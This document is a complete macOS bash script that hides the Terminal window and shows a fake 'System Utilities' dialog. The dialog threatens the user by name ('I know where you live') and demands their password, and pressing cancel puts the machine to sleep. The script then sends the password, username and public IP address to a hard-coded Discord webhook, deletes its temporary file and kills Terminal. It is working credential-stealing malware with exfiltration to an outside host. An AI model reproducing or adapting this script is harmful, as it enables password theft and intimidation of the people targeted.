#!/bin/bash
# Login Prompt Script for macOS – Updated with Sleep on Cancel
# This script displays a login prompt that instructs the user with two lines:
# "I know where you live, [FirstName]."
# "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"

# Hide Terminal immediately.
osascript -e 'tell application "Terminal" to set visible of front window to false'

# Get the current username.
username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /loginwindow/ { print $3 }')

# Initialize capture text.
capture="username=${username}\n_________________________________________________________________________________________\n\n"

# Define AppleScript for password prompt with sleep on cancel
read -r -d '' applescriptCode <<'EOF'
set fullName to (long user name of (system info))
set firstName to word 1 of fullName
set lastName to word -1 of fullName

set validInput to false
set userPassword to ""

repeat until validInput
    try
        set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
        
        if userPassword is not equal to "" then
            set validInput to true
            return userPassword
        end if
    on error
        # Return special code to signal cancel was pressed
        return "##CANCEL##"
    end try
end repeat
EOF

# Execute the AppleScript prompt and capture its output.
userPassword=$(osascript -e "$applescriptCode")

# Check if cancel was pressed
if [[ "$userPassword" == "##CANCEL##" ]]; then
    # Run the sleep command directly and give it time to execute
    osascript -e 'tell application "System Events" to sleep'
    # Allow time for the sleep command to take effect before script ends
    sleep 3
    exit 0
fi

# Append the captured password.
capture="${capture}password=${userPassword}\n"

# Capture the public IP address.
ipaddress=$(curl -s https://api.ipify.org)
capture="${capture}ipaddress=${ipaddress}"

# Save the captured information.
echo -e "$capture" > pass.txt

# Determine which Python interpreter to use (prefer python3).
if command -v python3 &>/dev/null; then
    PYTHON=python3
else
    PYTHON=python
fi

# Create the JSON payload.
payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < pass.txt)

# Send the payload to your Discord webhook.
DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139736552570900/GsKXFNHTYx7Ej7D36VnzpotosTaIhxZk4Qb9SMySCM052SQ371xSdNH2Bu_oWexZkmxR"
curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"

# Clean up
rm pass.txt

# Force kill Terminal after everything else is done
killall Terminal
